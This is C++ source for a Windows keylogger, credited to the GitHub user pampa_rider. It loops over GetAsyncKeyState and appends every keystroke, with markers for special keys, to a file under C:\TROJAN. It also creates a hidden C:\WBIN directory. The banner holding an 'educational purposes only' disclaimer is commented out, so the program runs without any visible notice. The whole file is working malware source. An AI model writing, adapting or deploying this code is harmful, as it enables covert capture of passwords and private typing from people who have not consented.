// Keylogger  
//2021 Develop with ❤ by pampa_rider (https://github.com/pampa-rider)
//twitter: pampa_rider

#define _WIN32_WINNT 0x0500
#include<Windows.h>

#include<string>
#include<stdlib.h>
#include<stdio.h>
#include<iostream>
#include<fstream>
#include <FileAPI.h>
using namespace std;

void log(string in_str)
{
CreateDirectory("C:\\WBIN",NULL);
SetFileAttributes("C:\\WBIN",FILE_ATTRIBUTE_HIDDEN);
fstream inFile;
inFile.open("C:\\TROJAN\\input.txt",fstream::app);
if(inFile.is_open())
{
inFile << in_str;
inFile.close();	
}

else
{
cout<<"error";
}
return;	
}

void get_logo()

{
cout<<"db   dD d88888b db    db db       .d88b.   d888b   d888b  d88888b d8888b."<<endl; 
cout<<"88 ,8P' 88'     `8b  d8' 88      .8P  Y8. 88' Y8b 88' Y8b 88'     88  `8D "<<endl; 
cout<<"88,8P   88ooooo  `8bd8'  88      88    88 88      88      88ooooo 88oobY' "<<endl; 
cout<<"88`8b   88~~~~~    88    88      88    88 88  ooo 88  ooo 88~~~~~ 88`8b   "<<endl; 
cout<<"88 `88. 88.        88    88booo. `8b  d8' 88. ~8~ 88. ~8~ 88.     88 `88. "<<endl; 
cout<<"YP   YD Y88888P    YP    Y88888P  `Y88P'   Y888P   Y888P  Y88888P 88   YD "<<endl; 

cout<<"-------------------------------------------------------------------------"<<endl;

cout<<"2021 - Develop with <3 by pampa_rider"<<endl;

cout<<"Atention: This code is for educational propourses only, not use it on machines without autorizacion."<<endl;
cout<<"Knowing doesn't Enought!!!"<<endl;
}

//create an hidden file






bool special_keys(int st_key)
{
switch(st_key)
{
case VK_SPACE:
log(" ");
return true;

case VK_SHIFT:
log("#SHIFT#");
return true;

case VK_RETURN:
log("\n");
return true;

case VK_BACK:
log("#BACK#");
return true;

case VK_RBUTTON:
log("#R_CLICK#");
return true;

case VK_CAPITAL:
log("#CAPSLCK#");
return true;

case VK_TAB:
log("#TAB#");
return true;

case VK_UP:
log("#UP#");
return true;

case VK_DOWN:
log("#DOWN#");
return true;

case VK_LEFT:
log("#LEFT#");
return true;

case VK_RIGHT:
log("#RIGHT#");
return true;

case VK_CONTROL:
log("#CONTROL#");
return true;

case VK_MENU:
log("#ALT#");
return true;

default:
return false;
}

}


int main()
{

//get_logo();	

char KEY='x';
string str_key;

while(true)
	{
		for(KEY=8;KEY<=190;KEY++)
		{

		if(GetAsyncKeyState(KEY) == -32767)
		{
			if(special_keys(KEY) == false)
			{
			
			//convert to string
			str_key = char(KEY);
			log(str_key);

			}

		}	

		}
	
	}
return 0;
}	

